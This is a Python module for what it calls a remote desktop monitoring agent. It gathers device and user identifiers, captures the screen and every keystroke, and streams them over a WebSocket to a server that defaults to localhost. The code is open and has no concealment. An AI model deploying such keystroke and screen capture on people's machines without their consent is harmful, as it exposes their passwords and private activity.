"""
Main agent module that orchestrates screen capture, keyboard monitoring,
and WebSocket communication for remote desktop monitoring.
"""

import asyncio
import socket
import uuid
import platform
import getpass
import psutil
import time
from typing import Dict, Any
from capture import ScreenCapture
from keyboard import KeyboardCapture
from websocket import WebSocketClient


class MonitoringAgent:
    """
    Main monitoring agent that coordinates all client components.
    """
    
    def __init__(
        self,
        server_url: str = "ws://localhost:8000/ws",
        target_fps: int = 10,
        jpeg_quality: int = 50
    ):
        """
        Initialize monitoring agent.
        
        Args:
            server_url: WebSocket server URL
            target_fps: Target screen capture FPS
            jpeg_quality: JPEG compression quality
        """
        self.server_url = server_url
        self.target_fps = target_fps
        self.jpeg_quality = jpeg_quality
        
        # Initialize screen capture first (needed for device info)
        self.screen_capture = ScreenCapture(
            target_fps=target_fps,
            jpeg_quality=jpeg_quality
        )
        
        # Gather device information (after screen_capture is initialized)
        self.device_info = self._gather_device_info()
        
        # Initialize remaining components
        self.keyboard_capture = KeyboardCapture()
        
        # Append MAC address to WebSocket URL as query parameter
        ws_url = f"{server_url}?mac_address={self.device_info['mac_address']}"
        self.ws_client = WebSocketClient(
            server_url=ws_url,
            device_info=self.device_info
        )
        
        # State
        self.running = False
        self.paused = False
        
        # Setup callbacks
        self.ws_client.on_connected = self._on_connected
        self.ws_client.on_disconnected = self._on_disconnected
        self.ws_client.on_error = self._on_error
    
    def _gather_device_info(self) -> Dict[str, Any]:
        """
        Gather comprehensive device information.
        
        Returns:
            Dictionary with device information
        """
        try:
            # Get MAC address
            mac = uuid.getnode()
            mac_address = ":".join([f"{(mac >> i) & 0xff:02x}" for i in range(40, -8, -8)])
            
            # Get IP address
            ip_address = socket.gethostbyname(socket.gethostname())
            
            # Get browser info (simplified - detect common browsers)
            browser = self._detect_browser()
            
            # Get OS info
            os_info = f"{platform.system()} {platform.release()}"
            
            return {
                "computer_name": socket.gethostname(),
                "mac_address": mac_address,
                "ip_address": ip_address,
                "username": getpass.getuser(),
                "browser": browser,
                "os": os_info,
                "resolution": f"{self.screen_capture.width}x{self.screen_capture.height}",
                "resolution_width": self.screen_capture.width,
                "resolution_height": self.screen_capture.height,
                "agent_version": "1.0.0"
            }
        except Exception as e:
            print(f"Error gathering device info: {e}")
            return {
                "computer_name": "Unknown",
                "mac_address": "Unknown",
                "ip_address": "Unknown",
                "username": "Unknown",
                "browser": "Unknown",
                "os": platform.system(),
                "resolution": "Unknown",
                "agent_version": "1.0.0"
            }
    
    def _detect_browser(self) -> str:
        """
        Detect the default browser (simplified detection).
        
        Returns:
            Browser name or "Unknown"
        """
        try:
            # Check for common browser processes
            browsers = {
                "chrome.exe": "Google Chrome",
                "firefox.exe": "Mozilla Firefox",
                "msedge.exe": "Microsoft Edge",
                "brave.exe": "Brave Browser",
                "opera.exe": "Opera"
            }
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() in browsers:
                        return browsers[proc.info['name'].lower()]
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass
        return "Unknown"
    
    def _on_connected(self):
        """Callback when WebSocket connects."""
        print("Agent connected to server")
    
    def _on_disconnected(self):
        """Callback when WebSocket disconnects."""
        print("Agent disconnected from server")
    
    def _on_error(self, error):
        """Callback when WebSocket error occurs."""
        print(f"Agent WebSocket error: {error}")
    
    def _screen_capture_loop(self):
        """Background thread for screen capture and transmission."""
        print("Screen capture loop started")
        while self.running:
            try:
                if not self.paused and self.ws_client.connected:
                    # Get frame from capture
                    frame = self.screen_capture.get_frame(timeout=0.1)
                    
                    if frame:
                        # Send via WebSocket
                        self.ws_client.send_frame_sync(frame)
                    else:
                        # Duplicate or capture failed - normal
                        pass
                else:
                    if not self.ws_client.connected:
                        # WebSocket not connected - normal during reconnect
                        pass
                    time.sleep(0.1)
                    
            except Exception as e:
                print(f"Screen capture loop error: {e}")
                time.sleep(0.1)
        print("Screen capture loop stopped")
    
    def _keyboard_capture_loop(self):
        """Background thread for keyboard event transmission."""
        while self.running:
            try:
                if not self.paused and self.ws_client.connected:
                    # Get batch of keyboard events
                    events = self.keyboard_capture.get_events_batch(max_count=10)
                    
                    if events:
                        # Send batch via WebSocket
                        self.ws_client.send_keyboard_events_batch_sync(events)
                else:
                    time.sleep(0.1)
                    
            except Exception as e:
                print(f"Keyboard capture loop error: {e}")
                time.sleep(0.1)
    
    def start(self):
        """Start the monitoring agent."""
        if not self.running:
            print("Starting monitoring agent...")
            self.running = True
            
            # Start screen capture
            self.screen_capture.start()
            
            # Start keyboard capture
            self.keyboard_capture.start()
            
            # Start WebSocket client
            self.ws_client.start()
            
            # Start capture loops in background threads
            import threading
            
            self.screen_thread = threading.Thread(
                target=self._screen_capture_loop,
                daemon=True
            )
            self.screen_thread.start()
            
            self.keyboard_thread = threading.Thread(
                target=self._keyboard_capture_loop,
                daemon=True
            )
            self.keyboard_thread.start()
            
            print("Monitoring agent started")
    
    def stop(self):
        """Stop the monitoring agent."""
        if self.running:
            print("Stopping monitoring agent...")
            self.running = False
            
            # Stop components
            self.screen_capture.stop()
            self.keyboard_capture.stop()
            self.ws_client.stop()
            
            print("Monitoring agent stopped")
    
    def pause(self):
        """Pause monitoring (stop sending data but keep connection)."""
        self.paused = True
        print("Monitoring paused")
    
    def resume(self):
        """Resume monitoring."""
        self.paused = False
        print("Monitoring resumed")
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Get current agent statistics.
        
        Returns:
            Dictionary with all statistics
        """
        return {
            "device_info": self.device_info,
            "screen_capture": self.screen_capture.get_stats(),
            "websocket": self.ws_client.get_stats(),
            "running": self.running,
            "paused": self.paused
        }


def main():
    """Main entry point for the agent."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Remote Desktop Monitoring Agent")
    parser.add_argument(
        "--server",
        default="ws://localhost:8000/ws",
        help="WebSocket server URL"
    )
    parser.add_argument(
        "--fps",
        type=int,
        default=10,
        help="Target FPS for screen capture (5-10)"
    )
    parser.add_argument(
        "--quality",
        type=int,
        default=50,
        help="JPEG quality (40-60)"
    )
    
    args = parser.parse_args()
    
    # Create and start agent
    agent = MonitoringAgent(
        server_url=args.server,
        target_fps=args.fps,
        jpeg_quality=args.quality
    )
    
    try:
        agent.start()
        
        # Keep running
        while True:
            time.sleep(1)
            
            # Print stats every 30 seconds
            if int(time.time()) % 30 == 0:
                stats = agent.get_stats()
                print(f"Stats: {stats}")
                
    except KeyboardInterrupt:
        print("\nShutting down...")
        agent.stop()


if __name__ == "__main__":
    main()
